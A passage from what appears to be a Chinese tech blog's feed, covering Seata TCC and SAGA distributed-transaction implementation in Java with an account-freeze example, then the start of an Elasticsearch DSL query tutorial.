class="string">&#x27;0&#x27;</span> COMMENT <span class="string">&#x27;冻结金额&#x27;</span>,</span><br><span class="line">  `state` <span class="type">int</span>(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;事务状态，0:try，1:confirm，2:cancel&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`xid`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 ROW_FORMAT<span class="operator">=</span>COMPACT;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中：</p><ul><li>xid：是全局事务id</li><li>freeze_money：用来记录用户冻结金额</li><li>state：用来记录事务状态</li></ul><p>那此时，我们的业务开怎么做呢？</p><ul><li>Try业务：<ul><li>记录冻结金额和事务状态到account_freeze表</li><li>扣减account表可用金额</li></ul></li><li>Confirm业务<ul><li>根据xid删除account_freeze表的冻结记录</li></ul></li><li>Cancel业务<ul><li>修改account_freeze表，冻结金额为0，state为2</li><li>修改account表，恢复可用金额</li></ul></li><li>如何判断是否空回滚？<ul><li>cancel业务中，根据xid查询account_freeze，如果为null则说明try还没做，需要空回滚</li></ul></li><li>如何避免业务悬挂？<ul><li>try业务中，根据xid查询account_freeze ，如果已经存在则证明Cancel已经执行，拒绝执行try业务</li></ul></li></ul><p>接下来，我们改造account-service，利用TCC实现余额扣减功能。</p><h4 id="2）声明TCC接口"><a href="#2）声明TCC接口" class="headerlink" title="2）声明TCC接口"></a>2）声明TCC接口</h4><p>TCC的Try、Confirm、Cancel方法都需要在接口中基于注解来声明，</p><p>我们在account-service项目中的<code>cn.itcast.account.service</code>包中新建一个接口，声明TCC三个接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContextParameter;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.LocalTCC;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.TwoPhaseBusinessAction;</span><br><span class="line"></span><br><span class="line"><span class="meta">@LocalTCC</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TwoPhaseBusinessAction(name = &quot;deduct&quot;, commitMethod = &quot;confirm&quot;, rollbackMethod = &quot;cancel&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deduct</span><span class="params">(<span class="meta">@BusinessActionContextParameter(paramName = &quot;userId&quot;)</span> String userId,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="meta">@BusinessActionContextParameter(paramName = &quot;money&quot;)</span><span class="keyword">int</span> money)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3）编写实现类"><a href="#3）编写实现类" class="headerlink" title="3）编写实现类"></a>3）编写实现类</h4><p>在account-service服务中的<code>cn.itcast.account.service.impl</code>包下新建一个类，实现TCC业务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.entity.AccountFreeze;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountFreezeMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.service.AccountTCCService;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.context.RootContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountTCCServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountMapper accountMapper;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountFreezeMapper freezeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deduct</span><span class="params">(String userId, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.获取事务id</span></span><br><span class="line">        String xid = RootContext.getXID();</span><br><span class="line">        <span class="comment">// 1.扣减可用余额</span></span><br><span class="line">        accountMapper.deduct(userId, money);</span><br><span class="line">        <span class="comment">// 2.记录冻结金额，事务状态</span></span><br><span class="line">        AccountFreeze freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">        freeze.setUserId(userId);</span><br><span class="line">        freeze.setFreezeMoney(money);</span><br><span class="line">        freeze.setState(AccountFreeze.State.TRY);</span><br><span class="line">        freeze.setXid(xid);</span><br><span class="line">        freezeMapper.insert(freeze);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1.获取事务id</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        <span class="comment">// 2.根据id删除冻结记录</span></span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.deleteById(xid);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.查询冻结记录</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        AccountFreeze freeze = freezeMapper.selectById(xid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.恢复可用余额</span></span><br><span class="line">        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());</span><br><span class="line">        <span class="comment">// 2.将冻结金额清零，状态改为CANCEL</span></span><br><span class="line">        freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">        freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.updateById(freeze);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4）空回滚和业务悬挂实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.itcast.account.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.entity.AccountFreeze;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountFreezeMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.mapper.AccountMapper;</span><br><span class="line"><span class="keyword">import</span> cn.itcast.account.service.AccountTCCService;</span><br><span class="line"><span class="keyword">import</span> io.seata.core.context.RootContext;</span><br><span class="line"><span class="keyword">import</span> io.seata.rm.tcc.api.BusinessActionContext;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountTCCServiceImpl</span> <span class="keyword">implements</span> <span class="title">AccountTCCService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountMapper accountMapper;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> AccountFreezeMapper freezeMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deduct</span><span class="params">(String userId, <span class="keyword">int</span> money)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.获取事务id</span></span><br><span class="line">        String xid = RootContext.getXID();</span><br><span class="line">        <span class="comment">// 查询freeze，防止业务悬挂</span></span><br><span class="line">        AccountFreeze oldFreeze = freezeMapper.selectById(xid);</span><br><span class="line">        <span class="keyword">if</span> (oldFreeze != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 拒绝业务</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.扣减可用余额</span></span><br><span class="line">        accountMapper.deduct(userId, money);</span><br><span class="line">        <span class="comment">// 2.记录冻结金额，事务状态</span></span><br><span class="line">        AccountFreeze freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">        freeze.setUserId(userId);</span><br><span class="line">        freeze.setFreezeMoney(money);</span><br><span class="line">        freeze.setState(AccountFreeze.State.TRY);</span><br><span class="line">        freeze.setXid(xid);</span><br><span class="line">        freezeMapper.insert(freeze);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">confirm</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 1.获取事务id</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        <span class="comment">// 2.根据id删除冻结记录</span></span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.deleteById(xid);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">cancel</span><span class="params">(BusinessActionContext ctx)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 0.查询冻结记录</span></span><br><span class="line">        String xid = ctx.getXid();</span><br><span class="line">        String userId = ctx.getActionContext(<span class="string">&quot;userId&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line">        AccountFreeze freeze = freezeMapper.selectById(xid);</span><br><span class="line">        <span class="comment">// 空回滚判断</span></span><br><span class="line">        <span class="keyword">if</span> (freeze == <span class="keyword">null</span>) &#123;</span><br><span class="line">            freeze = <span class="keyword">new</span> AccountFreeze();</span><br><span class="line">            freeze.setUserId(userId);</span><br><span class="line">            freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">            freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">            freeze.setXid(xid);</span><br><span class="line">            freezeMapper.insert(freeze);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 幂等判断</span></span><br><span class="line">        <span class="keyword">if</span>(freeze.getState() == AccountFreeze.State.CANCEL)&#123;</span><br><span class="line">            <span class="comment">// 已经处理过了，无需重复cancel</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 1.恢复可用余额</span></span><br><span class="line">        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());</span><br><span class="line">        <span class="comment">// 2.将冻结金额清零，状态改为CANCEL</span></span><br><span class="line">        freeze.setFreezeMoney(<span class="number">0</span>);</span><br><span class="line">        freeze.setState(AccountFreeze.State.CANCEL);</span><br><span class="line">        <span class="keyword">int</span> count = freezeMapper.updateById(freeze);</span><br><span class="line">        <span class="keyword">return</span> count == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-4-SAGA模式"><a href="#4-4-SAGA模式" class="headerlink" title="4.4.SAGA模式"></a>4.4.SAGA模式</h2><p>Saga 模式是 Seata 即将开源的长事务解决方案，将由蚂蚁金服主要贡献。</p><p>其理论基础是Hector &amp; Kenneth  在1987年发表的论文<a href="https://microservices.io/patterns/data/saga.html">Sagas</a>。</p><p>Seata官网对于Saga的指南：<a href="https://seata.io/zh-cn/docs/user/saga.html">https://seata.io/zh-cn/docs/user/saga.html</a></p><h3 id="4-4-1-原理"><a href="#4-4-1-原理" class="headerlink" title="4.4.1.原理"></a>4.4.1.原理</h3><p>在 Saga 模式下，分布式事务内有多个参与者，每一个参与者都是一个冲正补偿服务，需要用户根据业务场景实现其正向操作和逆向回滚操作。</p><p>分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。</p><p><img src="https://pic.imgdb.cn/item/639a0809b1fccdcd363f29f4.png"></p><p>Saga也分为两个阶段：</p><ul><li>一阶段：直接提交本地事务</li><li>二阶段：成功则什么都不做；失败则通过编写补偿业务来回滚</li></ul><h3 id="4-4-2-优缺点"><a href="#4-4-2-优缺点" class="headerlink" title="4.4.2.优缺点"></a>4.4.2.优缺点</h3><p>优点：</p><ul><li>事务参与者可以基于事件驱动实现异步调用，吞吐高</li><li>一阶段直接提交事务，无锁，性能好</li><li>不用编写TCC中的三个阶段，实现简单</li></ul><p>缺点：</p><ul><li>软状态持续时间不确定，时效性差</li><li>没有锁，没有事务隔离，会有脏写</li></ul><h2 id="4-5-四种模式对比"><a href="#4-5-四种模式对比" class="headerlink" title="4.5.四种模式对比"></a>4.5.四种模式对比</h2><p>我们从以下几个方面来对比四种实现：</p><ul><li>一致性：能否保证事务的一致性？强一致还是最终一致？</li><li>隔离性：事务之间的隔离性如何？</li><li>代码侵入：是否需要对业务代码改造？</li><li>性能：有无性能损耗？</li><li>场景：常见的业务场景</li></ul><p>如图：</p><p><img src="https://pic.imgdb.cn/item/639a0809b1fccdcd363f29f8.png"></p><h1 id="5-高可用"><a href="#5-高可用" class="headerlink" title="5.高可用"></a>5.高可用</h1><p>Seata的TC服务作为分布式事务核心，一定要保证集群的高可用性。</p><h2 id="5-1-高可用架构模型"><a href="#5-1-高可用架构模型" class="headerlink" title="5.1.高可用架构模型"></a>5.1.高可用架构模型</h2><p>搭建TC服务集群非常简单，启动多个TC服务，注册到nacos即可。</p><p>但集群并不能确保100%安全，万一集群所在机房故障怎么办？所以如果要求较高，一般都会做异地多机房容灾。</p><p>比如一个TC集群在上海，另一个TC集群在杭州：</p><p><img src="https://pic.imgdb.cn/item/639a0809b1fccdcd363f29ff.png"></p><p>微服务基于事务组（tx-service-group)与TC集群的映射关系，来查找当前应该使用哪个TC集群。当SH集群故障时，只需要将vgroup-mapping中的映射关系改成HZ。则所有微服务就会切换到HZ的TC集群了。</p><h2 id="5-2-实现高可用"><a href="#5-2-实现高可用" class="headerlink" title="5.2.实现高可用"></a>5.2.实现高可用</h2><p>第三章节：</p><p><img src="https://pic.imgdb.cn/item/639a0809b1fccdcd363f2a08.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分布式事务&quot;&gt;&lt;a href=&quot;#分布式事务&quot; class=&quot;headerlink&quot; title=&quot;分布式事务&quot;&gt;&lt;/a&gt;分布式事务&lt;/h1&gt;&lt;h1 id=&quot;1-分布式事务问题&quot;&gt;&lt;a href=&quot;#1-分布式事务问题&quot; class=&quot;headerlink&quot; ti</summary>
      
    
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/categories/Java/"/>
    
    <category term="框架" scheme="http://zephyr-cyber.github.io/categories/Java/%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="Java框架" scheme="http://zephyr-cyber.github.io/tags/Java%E6%A1%86%E6%9E%B6/"/>
    
    <category term="分布式事务" scheme="http://zephyr-cyber.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearch高级</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/2376083540.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/2376083540.html</id>
    <published>2022-07-22T03:43:45.000Z</published>
    <updated>2023-01-03T12:10:39.647Z</updated>
    
    <content type="html"><![CDATA[<p>我们已经导入了大量数据到elasticsearch中，实现了elasticsearch的数据存储功能。但elasticsearch最擅长的还是搜索和数据分析。<br />所以今天，我们研究下elasticsearch的数据搜索功能。我们会分别使用<strong>DSL</strong>和<strong>RestClient</strong>实现搜索。<br><a name="IO9W4"></a></p><h1 id="0-学习目标"><a href="#0-学习目标" class="headerlink" title="0.学习目标"></a>0.学习目标</h1><p><a name="xZaJf"></a></p><h1 id="1-DSL查询文档"><a href="#1-DSL查询文档" class="headerlink" title="1.DSL查询文档"></a>1.DSL查询文档</h1><p>elasticsearch的查询依然是基于JSON风格的DSL来实现的。<br><a name="wR3NH"></a></p><h2 id="1-1-DSL查询分类"><a href="#1-1-DSL查询分类" class="headerlink" title="1.1.DSL查询分类"></a>1.1.DSL查询分类</h2><p>Elasticsearch提供了基于JSON的DSL（<a href="https://_www.elastic.co_guide_en_elasticsearch_reference_current_query-dsl/">Domain Specific Language</a>）来定义查询。常见的查询类型包括：</p><ul><li><strong>查询所有</strong>：查询出所有数据，一般测试用。例如：match_all</li><li><strong>全文检索（full text）查询</strong>：利用分词器对用户输入内容分词，然后去倒排索引库中匹配。例如：<ul><li>match_query</li><li>multi_match_query</li></ul></li><li><strong>精确查询</strong>：根据精确词条值查找数据，一般是查找keyword、数值、日期、boolean等类型字段。例如：<ul><li>ids</li><li>range</li><li>term</li></ul></li><li><strong>地理（geo）查询</strong>：根据经纬度查询。例如：<ul><li>geo_distance</li><li>geo_bounding_box</li></ul></li><li><strong>复合（compound）查询</strong>：复合查询可以将上述各种查询条件组合起来，合并查询条件。例如：<ul><li>bool</li><li>function_score</li></ul></li></ul><p>查询的语法基本一致：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;查询类型&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;查询条件&quot;</span>: <span class="string">&quot;条件值&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们以查询所有为例，其中：</p><ul><li><p>查询类型为match_all</p></li><li><p>没有查询条件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询所有</span></span><br><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match_all&quot;</span>: &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其它查询无非就是<strong>查询类型</strong>、<strong>查询条件</strong>的变化。<br><a name="sP5bU"></a></p><h2 id="1-2-全文检索查询"><a href="#1-2-全文检索查询" class="headerlink" title="1.2.全文检索查询"></a>1.2.全文检索查询</h2><p><a name="Q3afF"></a></p><h3 id="1-2-1-使用场景"><a href="#1-2-1-使用场景" class="headerlink" title="1.2.1.使用场景"></a>1.2.1.使用场景</h3><p>全文检索查询的基本流程如下：</p></li><li><p>对用户搜索的内容做分词，得到词条</p></li><li><p>根据词条去倒排索引库中匹配，得到文档id</p></li><li><p>根据文档id找到文档，返回给用户</p></li></ul><p>比较常用的场景包括：</p><ul><li>商城的输入框搜索</li><li>百度输入框搜索</li></ul><p>例如京东：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490101-124b9131-b8c7-4a21-9990-7242f0175454.png#averageHue=%23f6efee&crop=0&crop=0&crop=1&crop=1&id=WGb76&originHeight=186&originWidth=1024&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />因为是拿着词条去匹配，因此参与搜索的字段也必须是可分词的text类型的字段。<br><a name="QXFkb"></a></p><h3 id="1-2-2-基本语法"><a href="#1-2-2-基本语法" class="headerlink" title="1.2.2.基本语法"></a>1.2.2.基本语法</h3><p>常见的全文检索查询包括：</p><ul><li>match查询：单字段查询</li><li>multi_match查询：多字段查询，任意一个字段符合条件就算符合查询条件</li></ul><p>match查询语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;FIELD&quot;</span>: <span class="string">&quot;TEXT&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>mulit_match语法如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /indexName/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;multi_match&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;query&quot;</span>: <span class="string">&quot;TEXT&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fields&quot;</span>: [<span class="string">&quot;FIELD1&quot;</span>, <span class="string">&quot; FIELD12&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="e0oma"></a></p><h3 id="1-2-3-示例"><a href="#1-2-3-示例" class="headerlink" title="1.2.3.示例"></a>1.2.3.示例</h3><p>match查询示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490209-54b063cd-9946-4b84-891b-f76e4d5f0a59.png#averageHue=%23d8e8e7&crop=0&crop=0&crop=1&crop=1&id=uKm2T&originHeight=588&originWidth=1758&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />multi_match查询示例：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/21797045/1670218490384-9c56b5a9-9e87-44e3-9cd7-f914077479a7.png#averageHue=%23f3f7fa&crop=0&crop=0&crop=1&crop=1&id=KXO9Z&originHeight=586&originWidth=1761&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />可以看到，两种查询结果是一样的，为什么？<br />因为我们将brand、name、business值都利用copy_to复制到了all字段中。因此你根据三个字段搜索，和根据all字段搜索效果当然一样了。<br />但是，搜索字段越多，对查询性能影响越大，因此建议采用copy_to，然后单字段查询的方式。<br><a name="qn18A"></a></p><h3 id="1-2-4-总结"><a href="#1-2-4-总结" class="headerlink" title="1.2.4.总结"></a>1.2.4.总结</h3><p>match和multi_match的区别是什么？</p><ul><li><p>match：根据一个字段查询</p></li><li><p>multi_match：根据多个字段查询，参与查询字段越多，查询性能越差<br><a name="MGeCg"></a></p><h2 id="1-3-精准查询"><a href="#1-3-精准查询" class="headerlink" title="1.3.精准查询"></a>1.3.精准查询</h2><p>精确查询一般是查找keyword、数值、日期、boolean等类型字段。所以<strong>不会</strong>对搜索条件分词。常见的有：</p></li><li><p>term：根据词条精确值查询</p></li><li><p>range：根据值的范围查询<br><a name="pKtFT"></a></p><h3 id="1-3-1-term查询"><a href="#1-3-1-term查询" class="headerlink" 